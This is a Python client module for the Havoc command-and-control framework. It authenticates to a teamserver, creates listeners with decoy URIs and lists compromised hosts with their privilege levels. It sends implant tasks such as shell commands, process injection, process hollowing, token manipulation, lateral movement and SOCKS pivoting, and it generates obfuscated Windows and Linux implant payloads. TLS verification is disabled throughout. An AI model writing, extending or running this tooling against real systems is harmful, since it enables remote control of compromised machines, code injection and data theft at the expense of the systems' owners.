"""
Havoc C2 — Implémentation complète.

Havoc utilise deux interfaces :
  1. WebSocket operator protocol (principal) — port 40056
     Format : JSON sur WebSocket ws(s)://host:port/
     Auth   : message {"Type":"login","Body":{"user":"...","pass":"..."}}
     Toutes les opérations (agents, listeners, tasks) passent par là.

  2. REST API (disponible dans certains builds) — même port, path /api
     Utilisée en fallback si config.extra["mode"] = "rest"

Référence source : github.com/HavocFramework/Havoc (teamserver/pkg/handler)
"""
from __future__ import annotations

import asyncio
import json
import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

# ── Types de messages WebSocket Havoc ─────────────────────────────────────────
_T_LOGIN          = "login"
_T_AGENT_LIST     = "demon/list"
_T_AGENT_RESPONSE = "demon/response"
_T_LISTENER_ADD   = "listener/add"
_T_LISTENER_LIST  = "listener/list"
_T_LISTENER_EDIT  = "listener/edit"
_T_LISTENER_REMOVE = "listener/remove"
_T_TASK_RUN       = "task/run"
_T_TASK_RESULT    = "task/result"
_T_PAYLOAD_BUILD  = "payload/build"


class HavocC2(RestC2Interface):
    """
    Havoc Teamserver — protocole WebSocket + REST API.

    Modes de connexion (config.extra["mode"]) :
      "websocket" (défaut) — protocole opérateur Havoc natif
      "rest"               — REST API (builds communautaires)

    Paramètres extra :
      mode       : "websocket" | "rest"  (défaut: websocket)
      ws_path    : chemin WebSocket      (défaut: "/")
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_listeners", "agent_kill",
        "screenshot", "process_list", "file_download", "file_upload",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._ws:          Any | None = None
        self._ws_task:     asyncio.Task | None = None
        self._pending_responses: dict[str, asyncio.Future] = {}
        self._agent_cache: dict[str, dict[str, Any]] = {}
        self._listener_cache: dict[str, dict[str, Any]] = {}
        self._mode = "websocket"

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config = config
        self._mode   = config.extra.get("mode", "websocket")

        if self._mode == "rest":
            return await self._connect_rest(config)
        return await self._connect_ws(config)

    # ── WebSocket (protocole natif) ───────────────────────────────────────────

    async def _connect_ws(self, config: C2Config) -> bool:
        try:
            import websockets  # type: ignore
        except ImportError as exc:
            raise C2ConnectionError(
                "websockets non installé. pip install websockets"
            ) from exc

        scheme  = "wss" if config.ssl else "ws"
        ws_path = config.extra.get("ws_path", "/")
        url     = f"{scheme}://{config.host}:{config.port}{ws_path}"
        ssl_ctx = False
        if config.ssl:
            import ssl as _ssl
            ssl_ctx = _ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = _ssl.CERT_NONE

        logger.info("Havoc : connexion WebSocket → %s", url)
        try:
            import websockets.client as wsc  # type: ignore
            self._ws = await asyncio.wait_for(
                wsc.connect(url, ssl=ssl_ctx or None),
                timeout=self.CONNECT_TIMEOUT,
            )
        except Exception as exc:
            raise C2ConnectionError(f"Havoc WebSocket connexion échouée : {exc}") from exc

        # Auth
        await self._ws_send(_T_LOGIN, {
            "user": config.username or "admin",
            "pass": config.password or "",
        })
        resp = await asyncio.wait_for(self._ws_recv(), timeout=10.0)
        if resp.get("Type") in ("login/error", "error"):
            raise C2AuthError(f"Havoc auth échouée : {resp}")
        logger.info("Havoc : authentifié via WebSocket")

        # Boucle de lecture en arrière-plan
        self._ws_task = asyncio.create_task(self._ws_reader_loop())
        return True

    async def _ws_send(self, msg_type: str, body: dict[str, Any]) -> None:
        if not self._ws:
            raise C2ConnectionError("WebSocket Havoc non connecté")
        payload = json.dumps({"Type": msg_type, "Body": body})
        await self._ws.send(payload)

    async def _ws_recv(self) -> dict[str, Any]:
        raw = await self._ws.recv()
        return json.loads(raw)

    async def _ws_request(
        self, msg_type: str, body: dict[str, Any], timeout: float = 15.0
    ) -> dict[str, Any]:
        """Envoie un message et attend la réponse correspondante."""
        req_id = str(uuid.uuid4())
        body["_req_id"] = req_id
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending_responses[req_id] = fut
        await self._ws_send(msg_type, body)
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        finally:
            self._pending_responses.pop(req_id, None)

    async def _ws_reader_loop(self) -> None:
        """Lit en continu les messages WebSocket et dispatche les réponses."""
        try:
            async for raw in self._ws:
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                req_id = msg.get("Body", {}).get("_req_id")
                if req_id and req_id in self._pending_responses:
                    fut = self._pending_responses.pop(req_id)
                    if not fut.done():
                        fut.set_result(msg)
                    continue
                # Messages non sollicités : mettre à jour le cache
                await self._handle_push(msg)
        except asyncio.CancelledError:
            pass
        except Exception as exc:
            logger.error("Havoc WS reader erreur : %s", exc)
            self._status = C2Status.ERROR

    async def _handle_push(self, msg: dict[str, Any]) -> None:
        """Mettre à jour les caches depuis les pushes serveur."""
        t    = msg.get("Type", "")
        body = msg.get("Body", {})
        if t == _T_AGENT_LIST or t == _T_AGENT_RESPONSE:
            for agent in body.get("Agents", [body]):
                aid = str(agent.get("AgentID") or agent.get("id", ""))
                if aid:
                    self._agent_cache[aid] = agent
        elif t == _T_LISTENER_LIST:
            for lst in body.get("Listeners", []):
                lid = str(lst.get("ListenerID") or lst.get("id", ""))
                if lid:
                    self._listener_cache[lid] = lst

    # ── REST API (fallback) ───────────────────────────────────────────────────

    async def _connect_rest(self, config: C2Config) -> bool:
        """Connexion REST (certains builds Havoc exposent /api)."""
        async with httpx.AsyncClient(
            base_url=config.base_url, verify=False, timeout=15.0
        ) as client:
            resp = await client.post(
                "/api/login",
                json={"username": config.username or "admin", "password": config.password or ""},
            )
            if resp.status_code not in (200, 201):
                raise C2AuthError(f"Havoc REST auth échouée [{resp.status_code}]")
            data = resp.json()
            token = data.get("token") or data.get("access_token")
            if not token:
                raise C2AuthError(f"Token Havoc absent : {data}")
            self._token = token
        self._client = self._build_client(config)
        logger.info("Havoc : authentifié via REST API")
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._ws_task:
            self._ws_task.cancel()
            try: await self._ws_task
            except asyncio.CancelledError: pass
        if self._ws:
            try: await self._ws.close()
            except Exception: pass
            self._ws = None
        if self._client:
            await self._client.aclose()
            self._client = None
        self._status = C2Status.DISCONNECTED

    async def get_status(self) -> C2Status:
        if self._mode == "rest":
            return await super().get_status()
        if not self._ws:
            return C2Status.DISCONNECTED
        try:
            if hasattr(self._ws, "closed") and self._ws.closed:
                return C2Status.DISCONNECTED
            return C2Status.CONNECTED
        except Exception:
            return C2Status.ERROR

    # ── Authenticate (pour RestC2Interface parent) ────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        # Utilisé uniquement en mode REST (appelé par connect() de RestC2Interface)
        # On override connect() donc cette méthode n'est appelée qu'explicitement
        async with httpx.AsyncClient(
            base_url=config.base_url, verify=False, timeout=15.0
        ) as client:
            resp = await client.post(
                "/api/login",
                json={"username": config.username or "admin", "password": config.password or ""},
            )
            data = resp.json()
            token = data.get("token") or data.get("access_token", "")
            if not token:
                raise C2AuthError("Token Havoc REST absent")
            return token

    # ── Listeners ─────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "http").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 80))
        name     = config.get("name", f"havoc-{protocol}-{port}")

        listener_body = {
            "Name":        name,
            "Type":        protocol.upper(),
            "Protocol":    protocol,
            "Host":        host,
            "Port":        port,
            "CallbackHost": config.get("callback_host", host),
            "Secure":      protocol == "https",
            "UserAgent":   config.get("user_agent", "Mozilla/5.0"),
            "Headers":     config.get("headers", []),
            "Uris":        config.get("uris", ["/news.php", "/api/v1/users"]),
            "HostBind":    host,
            "PortBind":    port,
        }

        if self._mode == "websocket":
            resp = await self._ws_request(_T_LISTENER_ADD, listener_body)
            body = resp.get("Body", {})
            lid  = str(body.get("ListenerID") or body.get("id") or uuid.uuid4())
            status = "running" if body.get("Status", "").lower() not in ("error", "failed") else "error"
        else:
            data = await self._post("/api/listeners", json=listener_body)
            lid    = str(data.get("id", uuid.uuid4()))
            status = "running" if data.get("status", "running") == "running" else "stopped"

        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port, protocol=protocol, status=status,
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        if self._mode == "websocket":
            try:
                await self._ws_request(_T_LISTENER_REMOVE, {"ListenerID": listener_id})
                return True
            except Exception as exc:
                logger.error("Havoc remove_listener WS : %s", exc)
                return False
        try:
            await self._delete(f"/api/listeners/{listener_id}")
            return True
        except Exception:
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        if self._mode == "websocket":
            try:
                resp = await self._ws_request(_T_LISTENER_LIST, {})
                items = resp.get("Body", {}).get("Listeners", [])
            except Exception:
                items = list(self._listener_cache.values())
        else:
            data  = await self._get("/api/listeners")
            items = data.get("listeners", data if isinstance(data, list) else [])

        return [
            Listener(
                id=str(l.get("ListenerID") or l.get("id", uuid.uuid4())),
                name=l.get("Name") or l.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=l.get("Host") or l.get("host", "0.0.0.0"),
                bind_port=int(l.get("Port") or l.get("port", 80)),
                protocol=(l.get("Protocol") or l.get("Type", "http")).lower(),
                status=("running" if (l.get("Status") or l.get("status", "running")).lower() == "running"
                        else "stopped"),
            )
            for l in items
        ]

    # ── Agents (Demons) ───────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        if self._mode == "websocket":
            try:
                resp  = await self._ws_request(_T_AGENT_LIST, {})
                items = resp.get("Body", {}).get("Agents", [])
            except Exception:
                items = list(self._agent_cache.values())
        else:
            data  = await self._get("/api/agents")
            items = data.get("agents", data if isinstance(data, list) else [])

        return [self._parse_demon(a) for a in items]

    def _parse_demon(self, a: dict[str, Any]) -> Implant:
        aid = str(a.get("AgentID") or a.get("id", uuid.uuid4()))
        meta = a.get("Info", a)  # "Info" sous-objet dans le protocole WS

        # Timestamps Havoc (Unix ms ou ISO)
        def _parse_ts(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except (OSError, OverflowError):
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try: return datetime.strptime(v[:19], fmt)
                    except ValueError: pass
            return datetime.utcnow()

        integrity_raw = str(meta.get("Elevated") or meta.get("integrity", "")).lower()
        integrity = "SYSTEM" if "system" in integrity_raw or integrity_raw == "true" else (
            "ADMIN" if "admin" in integrity_raw or "high" in integrity_raw else "USER"
        )

        return Implant(
            id=aid,
            name=str(meta.get("ComputerName") or meta.get("hostname", aid)),
            c2_type=self._config.c2_type,
            listener_id=str(meta.get("Listener") or meta.get("listener_id", "")),
            external_ip=str(meta.get("ExternalIP") or meta.get("external_ip", "")),
            internal_ip=str(meta.get("InternalIP") or meta.get("internal_ip", "")),
            hostname=str(meta.get("ComputerName") or meta.get("hostname", "")),
            username=str(meta.get("Username") or meta.get("username", "")),
            os=str(meta.get("OSVersion") or meta.get("os", "")),
            arch=str(meta.get("ProcessArch") or meta.get("arch", "")),
            pid=int(meta.get("ProcessID") or meta.get("pid", 0)),
            process_name=str(meta.get("ProcessName") or meta.get("process", "")),
            integrity=integrity,
            last_checkin=_parse_ts(meta.get("LastCheckin") or meta.get("last_checkin")),
            first_seen=_parse_ts(meta.get("FirstCheckin") or meta.get("first_seen")),
            active=not bool(meta.get("Dead") or meta.get("dead")),
        )

    # ── Tâches ────────────────────────────────────────────────────────────────

    # Mapping commande → Command ID Havoc (demon/protocol.go)
    _CMD_MAP: dict[str, int] = {
        "shell":       0x01,
        "upload":      0x02,
        "download":    0x03,
        "ls":          0x04,  # FileBrowse
        "cd":          0x05,
        "mkdir":       0x06,
        "rm":          0x07,
        "ps":          0x08,  # ProcList
        "kill":        0x09,  # ProcKill
        "screenshot":  0x0A,
        "inject":      0x0B,
        "token":       0x0C,
        "pivot":       0x0D,
        "sleep":       0x0E,
        "jitter":      0x0F,
        "exit":        0x10,
        "whoami":      0x11,
        "pwd":         0x12,
        "cat":         0x13,
        "env":         0x14,
        "reg":         0x15,
        "net":         0x16,
        "jump":        0x17,
        "socks":       0x18,
        "portscan":    0x19,
        "assembly":    0x1A,  # .NET assembly in-memory
        "inline-exec": 0x1B,
        "shinject":    0x1C,
        "dllinject":   0x1D,
        "hollowing":   0x1E,
        "spawndll":    0x1F,
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        task_id   = str(uuid.uuid4())
        args_list = args or []
        cmd_lower = command.lower().split()[0]
        cmd_id    = self._CMD_MAP.get(cmd_lower, 0x01)  # shell par défaut

        full_args = (command.split()[1:] if " " in command else []) + args_list

        if self._mode == "websocket":
            body = {
                "AgentID":  agent_id,
                "CommandID": cmd_id,
                "Command":   command,
                "Arguments": full_args,
                "IsX64":     True,
            }
            resp     = await self._ws_request(_T_TASK_RUN, body, timeout=30.0)
            resp_body = resp.get("Body", {})
            return Task(
                id=str(resp_body.get("TaskID", task_id)),
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args_list,
                status=resp_body.get("Status", "sent"),
                result=resp_body.get("Output"),
                completed_at=datetime.utcnow() if resp_body.get("Output") else None,
            )

        # REST
        data = await self._post(f"/api/agents/{agent_id}/tasks", json={
            "command": command,
            "args":    full_args,
        })
        return Task(
            id=str(data.get("task_id", task_id)),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=data.get("status", "sent"),
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        if self._mode == "websocket":
            # En WS, les résultats arrivent en push — vérifier le cache
            return {"task_id": task_id, "note": "Résultat livré en push WebSocket"}
        data = await self._get(f"/api/tasks/{task_id}")
        return {
            "task_id": task_id,
            "status":  data.get("status"),
            "result":  data.get("output", ""),
        }

    # ── Payload ───────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        arch_map = {"x64": "x64", "x86": "x86"}
        fmt_map  = {
            "exe":       "Windows/exe",
            "dll":       "Windows/dll",
            "shellcode": "Windows/shellcode",
            "elf":       "Linux/elf",
        }
        payload_type = fmt_map.get(config.format, "Windows/exe")
        os_str, fmt_str = payload_type.split("/")

        body = {
            "Agent":     "Demon",
            "ListenerID": config.listener_id,
            "Config": {
                "Arch":        arch_map.get(config.arch, "x64"),
                "Format":      fmt_str,
                "OS":          os_str,
                "Sleep":       config.sleep * 1000,   # Havoc = millisecondes
                "Jitter":      config.jitter,
                "Obfuscation": config.obfuscation,
                "SendConsole": False,
            },
        }

        if self._mode == "websocket":
            resp = await self._ws_request(_T_PAYLOAD_BUILD, body, timeout=60.0)
            b64_data = resp.get("Body", {}).get("FileBase64", "")
            if b64_data:
                import base64
                return base64.b64decode(b64_data)
            return b""

        data = await self._post("/api/payloads/generate", json=body)
        file_id = data.get("file_id") or data.get("id")
        if file_id:
            resp = await self._client.get(f"/api/payloads/{file_id}/download")
            return resp.content if resp.status_code == 200 else b""
        b64 = data.get("data", "")
        if b64:
            import base64
            return base64.b64decode(b64)
        return b""

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
